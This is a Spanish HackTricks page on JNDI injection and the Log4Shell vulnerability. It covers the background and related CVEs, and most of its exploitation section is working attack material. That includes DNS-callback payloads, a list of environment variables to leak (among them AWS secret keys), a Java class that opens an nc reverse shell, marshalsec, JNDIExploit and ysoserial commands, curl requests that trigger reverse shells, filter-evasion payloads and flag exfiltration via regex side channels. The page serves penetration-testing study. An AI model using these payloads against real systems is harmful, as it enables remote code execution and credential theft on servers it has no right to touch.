# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Informaci칩n B치sica

JNDI, integrado en Java desde finales de la d칠cada de 1990, sirve como un servicio de directorio, permitiendo a los programas Java localizar datos u objetos a trav칠s de un sistema de nombres. Admite varios servicios de directorio a trav칠s de interfaces de proveedor de servicios (SPI), lo que permite la recuperaci칩n de datos de diferentes sistemas, incluidos objetos Java remotos. Los SPI comunes incluyen CORBA COS, Registro de Java RMI y LDAP.

### Referencia de Nombres JNDI

Los objetos Java se pueden almacenar y recuperar utilizando Referencias de Nombres JNDI, que se presentan en dos formas:

* **Direcciones de Referencia**: Especifica la ubicaci칩n de un objeto (por ejemplo, _rmi://servidor/ref_), permitiendo la recuperaci칩n directa desde la direcci칩n especificada.
* **F치brica Remota**: Hace referencia a una clase de f치brica remota. Cuando se accede, la clase se descarga e instancia desde la ubicaci칩n remota.

Sin embargo, este mecanismo puede ser explotado, lo que potencialmente lleva a la carga y ejecuci칩n de c칩digo arbitrario. Como medida de seguridad:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` de forma predeterminada desde JDK 7u21, restringiendo la carga de objetos remotos. Un Administrador de Seguridad limita a칰n m치s lo que se puede cargar.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` de forma predeterminada desde JDK 6u141, 7u131, 8u121, bloqueando la ejecuci칩n de objetos Java cargados de forma remota. Si se establece en `true`, la ejecuci칩n de c칩digo remoto es posible sin la supervisi칩n de un Administrador de Seguridad.
* **CORBA**: No tiene una propiedad espec칤fica, pero el Administrador de Seguridad siempre est치 activo.

Sin embargo, el **Administrador de Nombres**, responsable de resolver los enlaces JNDI, carece de mecanismos de seguridad integrados, lo que potencialmente permite la recuperaci칩n de objetos desde cualquier fuente. Esto representa un riesgo ya que las protecciones de RMI, LDAP y CORBA pueden ser eludidas, lo que lleva a la carga de objetos Java arbitrarios o a la explotaci칩n de componentes de aplicaci칩n existentes (gadgets) para ejecutar c칩digo malicioso.

Ejemplos de URLs explotables incluyen:

* _rmi://servidor-atacante/bar_
* _ldap://servidor-atacante/bar_
* _iiop://servidor-atacante/bar_

A pesar de las protecciones, las vulnerabilidades persisten, principalmente debido a la falta de salvaguardias contra la carga de JNDI desde fuentes no confiables y la posibilidad de eludir las protecciones existentes.

### Ejemplo de JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Incluso si has establecido un **`PROVIDER_URL`**, puedes indicar uno diferente en una b칰squeda y se acceder치 a 칠l: `ctx.lookup("<url-controlada-por-atacante>")` y eso es lo que un atacante aprovechar치 para cargar objetos arbitrarios desde un sistema controlado por 칠l.

### Descripci칩n general de CORBA

CORBA (Common Object Request Broker Architecture) emplea una **Referencia de Objeto Interoperable (IOR)** para identificar de forma 칰nica objetos remotos. Esta referencia incluye informaci칩n esencial como:

* **ID de Tipo**: Identificador 칰nico para una interfaz.
* **Codebase**: URL para obtener la clase de stub.

Es importante destacar que CORBA no es inherentemente vulnerable. Garantizar la seguridad generalmente implica:

* Instalaci칩n de un **Administrador de Seguridad**.
* Configurar el Administrador de Seguridad para permitir conexiones a bases de c칩digo potencialmente maliciosas. Esto se puede lograr a trav칠s de:
* Permiso de socket, por ejemplo, `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* Permisos de lectura de archivos, ya sea universalmente (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) o para directorios espec칤ficos donde podr칤an colocarse archivos maliciosos.

Sin embargo, algunas pol칤ticas de proveedores pueden ser permisivas y permitir estas conexiones de forma predeterminada.

### Contexto RMI

Para RMI (Invocaci칩n Remota de M칠todos), la situaci칩n es algo diferente. Al igual que con CORBA, la descarga arbitraria de clases est치 restringida de forma predeterminada. Para explotar RMI, t칤picamente se necesitar칤a eludir el Administrador de Seguridad, un logro tambi칠n relevante en CORBA.

### LDAP

En primer lugar, debemos distinguir entre una B칰squeda y una Consulta.\
Una **b칰squeda** utilizar치 una URL como `ldap://localhost:389/o=JNDITutorial` para encontrar el objeto JNDITutorial de un servidor LDAP y **recuperar sus atributos**.\
Una **consulta** est치 destinada a **servicios de nombres** ya que queremos obtener **lo que est칠 enlazado a un nombre**.

Si la b칰squeda LDAP se invoc칩 con **SearchControls.setReturningObjFlag() con `true`, entonces el objeto devuelto ser치 reconstruido**.

Por lo tanto, hay varias formas de atacar estas opciones.\
Un **atacante puede envenenar registros LDAP introduciendo payloads** en ellos que se ejecutar치n en los sistemas que los recopilan (muy 칰til para **comprometer decenas de m치quinas** si se tiene acceso al servidor LDAP). Otra forma de explotar esto ser칤a realizar un **ataque de MitM en una b칰squeda LDAP**, por ejemplo.

En caso de que puedas **hacer que una aplicaci칩n resuelva una URL LDAP JNDI**, puedes controlar el LDAP que se buscar치, y podr칤as enviar de vuelta el exploit (log4shell).

#### Exploit de Deserializaci칩n

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

El **exploit est치 serializado** y ser치 deserializado.\
En caso de que `trustURLCodebase` sea `true`, un atacante puede proporcionar sus propias clases en la base de c칩digo, de lo contrario, necesitar치 abusar de gadgets en el classpath.

#### Exploit de Referencia JNDI

Es m치s f치cil atacar este LDAP usando **referencias de JavaFactory**:

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Vulnerabilidad Log4Shell

La vulnerabilidad se introduce en Log4j porque admite una [**sintaxis especial**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) en forma de `${prefijo:nombre}` donde `prefijo` es uno de varios [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) donde `nombre` debe evaluarse. Por ejemplo, `${java:version}` es la versi칩n actual de Java en ejecuci칩n.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) introdujo una caracter칤stica de `jndi` Lookup. Esta caracter칤stica permite la recuperaci칩n de variables a trav칠s de JNDI. T칤picamente, la clave se prefiere autom치ticamente con `java:comp/env/`. Sin embargo, si la clave en s칤 incluye un **":"**, este prefijo predeterminado no se aplica.

Con un **":" presente** en la clave, como en `${jndi:ldap://ejemplo.com/a}` no hay prefijo y se **consulta al servidor LDAP para el objeto**. Y estos Lookups se pueden utilizar tanto en la configuraci칩n de Log4j como al registrar l칤neas.

Por lo tanto, lo 칰nico necesario para obtener RCE es una **versi칩n vulnerable de Log4j procesando informaci칩n controlada por el usuario**. Y debido a que esta es una biblioteca ampliamente utilizada por aplicaciones Java para registrar informaci칩n (incluidas las aplicaciones orientadas a Internet) era muy com칰n tener log4j registrando, por ejemplo, cabeceras HTTP recibidas como el User-Agent. Sin embargo, log4j **no se usa solo para registrar informaci칩n HTTP sino cualquier entrada** y datos que el desarrollador haya indicado.
## Resumen de CVEs relacionados con Log4Shell

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Cr칤tico]**

Esta vulnerabilidad es una grave **falla de deserializaci칩n no confiable** en el componente `log4j-core`, afectando versiones desde 2.0-beta9 hasta 2.14.1. Permite la **ejecuci칩n remota de c칩digo (RCE)**, lo que permite a los atacantes tomar el control de los sistemas. El problema fue reportado por Chen Zhaojun del Equipo de Seguridad de Alibaba Cloud y afecta a varios frameworks de Apache. La correcci칩n inicial en la versi칩n 2.15.0 fue incompleta. Se encuentran disponibles reglas Sigma para la defensa ([Regla 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [Regla 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Cr칤tico]**

Inicialmente calificado como bajo pero luego actualizado a cr칤tico, este CVE es una falla de **Denegaci칩n de Servicio (DoS)** resultante de una correcci칩n incompleta en 2.15.0 para CVE-2021-44228. Afecta a configuraciones no predeterminadas, lo que permite a los atacantes causar ataques DoS a trav칠s de cargas manipuladas. Un [tweet](https://twitter.com/marcioalm/status/1471740771581652995) muestra un m칠todo de bypass. El problema se resuelve en las versiones 2.16.0 y 2.12.2 al eliminar los patrones de b칰squeda de mensajes y deshabilitar JNDI de forma predeterminada.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Alto]**

Afectando a las versiones **Log4j 1.x** en configuraciones no predeterminadas que utilizan `JMSAppender`, este CVE es una falla de deserializaci칩n no confiable. No hay una correcci칩n disponible para la rama 1.x, que ha llegado al final de su vida 칰til, y se recomienda actualizar a `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderado]**

Esta vulnerabilidad afecta al **framework de registro Logback**, sucesor de Log4j 1.x. Se pensaba que el framework era seguro, pero se descubri칩 que era vulnerable, y se han lanzado nuevas versiones (1.3.0-alpha11 y 1.2.9) para abordar el problema.

### **CVE-2021-45105** **\[Alto]**

Log4j 2.16.0 contiene una falla de DoS, lo que llev칩 al lanzamiento de `log4j 2.17.0` para solucionar el CVE. Se pueden encontrar m치s detalles en el [informe](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/) de BleepingComputer.

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Afectando a la versi칩n 2.17 de log4j, este CVE requiere que el atacante controle el archivo de configuraci칩n de log4j. Involucra una posible ejecuci칩n de c칩digo arbitrario a trav칠s de un JDBCAppender configurado. Se pueden encontrar m치s detalles en la publicaci칩n del blog de [Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Explotaci칩n de Log4Shell

### Descubrimiento

Esta vulnerabilidad es muy f치cil de descubrir si no est치 protegida, ya que enviar치 al menos una **solicitud DNS** a la direcci칩n que indiques en tu carga 칰til. Por lo tanto, cargas 칰tiles como:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (usando [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (usando [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (usando Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (usando [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (usando [huntress](https://log4shell.huntress.com))

Ten en cuenta que **incluso si se recibe una solicitud DNS, eso no significa que la aplicaci칩n sea explotable** (o incluso vulnerable), deber치s intentar explotarla.

{% hint style="info" %}
Recuerda que para **explotar la versi칩n 2.15** necesitas agregar el **bypass de verificaci칩n de localhost**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Descubrimiento Local**

Busca **versiones locales vulnerables** de la biblioteca con:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verificaci칩n**

Algunas de las plataformas mencionadas anteriormente te permitir치n insertar datos variables que se registrar치n cuando se soliciten.\
Esto puede ser muy 칰til para 2 cosas:

* Para **verificar** la vulnerabilidad
* Para **exfiltrar informaci칩n** abusando de la vulnerabilidad

Por ejemplo, podr칤as solicitar algo como:\
o como `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** y si se recibe una **solicitud DNS con el valor de la variable de entorno**, sabr치s que la aplicaci칩n es vulnerable.

Otra informaci칩n que podr칤as intentar **filtrar**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### Informaci칩n de RCE

{% hint style="info" %}
Los hosts que ejecutan versiones de JDK superiores a 6u141, 7u131 o 8u121 est치n protegidos contra el vector de ataque de carga de clases LDAP. Esto se debe a la desactivaci칩n predeterminada de `com.sun.jndi.ldap.object.trustURLCodebase`, que evita que JNDI cargue un codebase remoto a trav칠s de LDAP. Sin embargo, es crucial tener en cuenta que estas versiones **no est치n protegidas contra el vector de ataque de deserializaci칩n**.

Para los atacantes que buscan explotar estas versiones de JDK superiores, es necesario aprovechar un **gadget de confianza** dentro de la aplicaci칩n Java. Herramientas como ysoserial o JNDIExploit se utilizan a menudo con este prop칩sito. Por el contrario, explotar versiones inferiores de JDK es relativamente m치s f치cil, ya que estas versiones pueden manipularse para cargar y ejecutar clases arbitrarias.

Para **m치s informaci칩n** (_como limitaciones en los vectores RMI y CORBA_) **consulte la secci칩n anterior de Referencia de Nombres JNDI** o [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec con carga 칰til personalizada

Puedes probar esto en la **caja THM:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Utiliza la herramienta [**marshalsec**](https://github.com/mbechler/marshalsec) (versi칩n jar disponible [**aqu칤**](https://github.com/RandomRobbieBF/marshalsec-jar)). Este enfoque establece un servidor de referencia LDAP para redirigir conexiones a un servidor HTTP secundario donde se alojar치 el exploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Para incitar al objetivo a cargar un c칩digo de shell inverso, crea un archivo Java llamado `Exploit.java` con el siguiente contenido:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Compila el archivo Java en un archivo de clase usando: `javac Exploit.java -source 8 -target 8`. A continuaci칩n, inicia un **servidor HTTP** en el directorio que contiene el archivo de clase con: `python3 -m http.server`. Aseg칰rate de que el **servidor LDAP de marshalsec** haga referencia a este servidor HTTP.

Desencadena la ejecuci칩n de la clase de exploit en el servidor web susceptible enviando un payload similar a:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Nota:** Esta vulnerabilidad se basa en la configuraci칩n de Java para permitir la carga remota de c칩digo base a trav칠s de LDAP. Si esto no es permitido, considere explotar una clase de confianza para la ejecuci칩n de c칩digo arbitrario.

### RCE - **JNDIExploit**

{% hint style="info" %}
Tenga en cuenta que por alguna raz칩n, el autor elimin칩 este proyecto de GitHub despu칠s del descubrimiento de log4shell. Puede encontrar una versi칩n en cach칠 en [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) pero si desea respetar la decisi칩n del autor, utilice un m칠todo diferente para explotar esta vulnerabilidad.

Adem치s, no podr치 encontrar el c칩digo fuente en el archivo de la m치quina del tiempo, por lo que deber치 analizar el c칩digo fuente o ejecutar el archivo JAR sabiendo que no sabe qu칠 est치 ejecutando.
{% endhint %}

Para este ejemplo, simplemente puede ejecutar este **servidor web vulnerable a log4shell** en el puerto 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_en el README encontrar치 c칩mo ejecutarlo_). Esta aplicaci칩n vulnerable est치 registrando con una versi칩n vulnerable de log4shell el contenido del encabezado de la solicitud HTTP _X-Api-Version_.

Luego, puede descargar el archivo JAR de **JNDIExploit** y ejecutarlo con:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Despu칠s de leer el c칩digo durante solo un par de minutos, en _com.feihong.ldap.LdapServer_ y _com.feihong.ldap.HTTPServer_ puedes ver c칩mo se crean los **servidores LDAP y HTTP**. El servidor LDAP entender치 qu칠 carga 칰til debe servir y redirigir치 a la v칤ctima al servidor HTTP, que servir치 el exploit.\
En _com.feihong.ldap.gadgets_ puedes encontrar **algunos gadgets espec칤ficos** que se pueden utilizar para ejecutar la acci칩n deseada (potencialmente ejecutar c칩digo arbitrario). Y en _com.feihong.ldap.template_ puedes ver las diferentes clases de plantillas que **generar치n los exploits**.

Puedes ver todos los exploits disponibles con **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Algunos 칰tiles son:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Entonces, en nuestro ejemplo, ya tenemos esa aplicaci칩n vulnerable de docker en ejecuci칩n. Para atacarla:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Cuando env칤es los ataques, ver치s alguna salida en la terminal donde ejecutaste **JNDIExploit-1.2-SNAPSHOT.jar**.

**Recuerda verificar `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` para otras opciones de explotaci칩n. Adem치s, en caso de necesitarlo, puedes cambiar el puerto de los servidores LDAP y HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

De manera similar al exploit anterior, puedes intentar usar [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para explotar esta vulnerabilidad.\
Puedes generar las URLs para enviar al objetivo ejecutando:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Este ataque utilizando un objeto Java generado personalizado funcionar치 en laboratorios como la **sala solar de THM**. Sin embargo, esto generalmente no funcionar치 (ya que por defecto Java no est치 configurado para cargar una base de c칩digo remota utilizando LDAP) creo que porque no est치 abusando de una clase de confianza para ejecutar c칩digo arbitrario._

### RCE - ysoserial & JNDI-Exploit-Kit

Esta opci칩n es realmente 칰til para atacar **versiones de Java configuradas para confiar solo en clases especificadas y no en todos**. Por lo tanto, **ysoserial** se utilizar치 para generar **serializaciones de clases de confianza** que pueden ser utilizadas como gadgets para **ejecutar c칩digo arbitrario** (_la clase de confianza abusada por ysoserial debe ser utilizada por el programa Java v칤ctima para que el exploit funcione_).

Usando **ysoserial** o [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) puedes crear el exploit de deserializaci칩n que ser치 descargado por JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Utiliza [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para generar **enlaces JNDI** donde el exploit estar치 esperando conexiones de las m치quinas vulnerables. Puedes servir **diferentes exploits que pueden generarse autom치ticamente** por el JNDI-Exploit-Kit o incluso tus **propios payloads de deserializaci칩n** (generados por ti o por ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Ahora puedes usar f치cilmente un enlace JNDI generado para explotar la vulnerabilidad y obtener un **shell inverso** simplemente envi치ndolo a una versi칩n vulnerable de log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Saltos de seguridad
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:캼}}:ldap://...} //Notice the unicode "i"
```
### Esc치neres Autom치ticos

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Encuentra bibliotecas locales vulnerables

### Laboratorios para probar

* [**M치quina LogForge HTB**](https://app.hackthebox.com/tracks/UHC-track)
* [**Sala Solar de Try Hack Me**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Explotaci칩n de Log4Shell

En este [**writeup de CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) se explica bien c칩mo es potencialmente **posible** **abusar** algunas caracter칤sticas de **Log4J**.

La [**p치gina de seguridad**](https://logging.apache.org/log4j/2.x/security.html) de Log4j tiene algunas frases interesantes:

> A partir de la versi칩n 2.16.0 (para Java 8), la caracter칤stica de **b칰squeda de mensajes ha sido eliminada por completo**. Las **b칰squedas en la configuraci칩n siguen funcionando**. Adem치s, Log4j ahora deshabilita el acceso a JNDI de forma predeterminada. Las b칰squedas de JNDI en la configuraci칩n ahora deben habilitarse expl칤citamente.

> A partir de la versi칩n 2.17.0 (y 2.12.3 y 2.3.1 para Java 7 y Java 6), **solo las cadenas de b칰squeda en la configuraci칩n se expanden de forma recursiva**; en cualquier otro uso, solo se resuelve la b칰squeda de nivel superior, y las b칰squedas anidadas no se resuelven.

Esto significa que por defecto puedes **olvidarte de usar cualquier `exploit` de `jndi`**. Adem치s, para realizar **b칰squedas recursivas** necesitas tenerlas configuradas.

Por ejemplo, en ese CTF esto estaba configurado en el archivo log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### B칰squedas de Env

En [este CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) el atacante controlaba el valor de `${sys:cmd}` y necesitaba exfiltrar la bandera de una variable de entorno.\
Como se ve en esta p치gina en [**cargas 칰tiles anteriores**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) hay diferentes formas de acceder a variables de entorno, como: **`${env:FLAG}`**. En este CTF esto fue in칰til pero podr칤a ser 칰til en otros escenarios de la vida real.

### Exfiltraci칩n en Excepciones

En el CTF, **no se pod칤a acceder al stderr** de la aplicaci칩n java usando log4J, pero las **excepciones de Log4J se env칤an a stdout**, lo cual se imprim칤a en la aplicaci칩n python. Esto significaba que al desencadenar una excepci칩n podr칤amos acceder al contenido. Una excepci칩n para exfiltrar la bandera fue: **`${java:${env:FLAG}}`.** Esto funciona porque **`${java:CTF{blahblah}}`** no existe y se mostrar치 una excepci칩n con el valor de la bandera:

![](<../../.gitbook/assets/image (157).png>)

### Patrones de Conversi칩n en Excepciones

Solo por mencionarlo, tambi칠n podr칤as inyectar nuevos [**patrones de conversi칩n**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) y desencadenar excepciones que se registrar치n en `stdout`. Por ejemplo:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Esto no result칩 칰til para exfiltrar datos dentro del mensaje de error, porque la b칰squeda no se resolvi칩 antes del patr칩n de conversi칩n, pero podr칤a ser 칰til para otras cosas como la detecci칩n.

### Patrones de Conversi칩n Regex

Sin embargo, es posible usar algunos **patrones de conversi칩n que admiten regexes** para exfiltrar informaci칩n de una b칰squeda mediante el uso de regexes y abusando de comportamientos de **b칰squeda binaria** o basados en el **tiempo**.

* **B칰squeda binaria a trav칠s de mensajes de excepci칩n**

El patr칩n de conversi칩n **`%replace`** se puede usar para **reemplazar** **contenido** de una **cadena** incluso usando **regexes**. Funciona as칤: `replace{patr칩n}{regex}{sustituci칩n}`\
Abusando de este comportamiento podr칤as hacer que el **reemplazo desencadene una excepci칩n si el regex coincide** con algo dentro de la cadena (y no habr치 excepci칩n si no se encuentra) de esta manera:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Basado en el tiempo**

Como se mencion칩 en la secci칩n anterior, **`%replace`** admite **regexes**. Por lo tanto, es posible utilizar un payload de la [p치gina de ReDoS](../regular-expression-denial-of-service-redos.md) para causar un **tiempo de espera** en caso de encontrar la bandera.\
Por ejemplo, un payload como `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` desencadenar칤a un **tiempo de espera** en ese CTF.

En este [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), en lugar de usar un ataque ReDoS, se utiliz칩 un **ataque de amplificaci칩n** para causar una diferencia de tiempo en la respuesta:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Si la bandera comienza con `flagGuess`, toda la bandera se reemplaza con 29 `#`-s (us칠 este car치cter porque probablemente no formar칤a parte de la bandera). **Cada uno de los 29 `#`-s resultantes luego es reemplazado por 54 `#`-s**. Este proceso se repite **6 veces**, lo que lleva a un total de ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-s!**
>
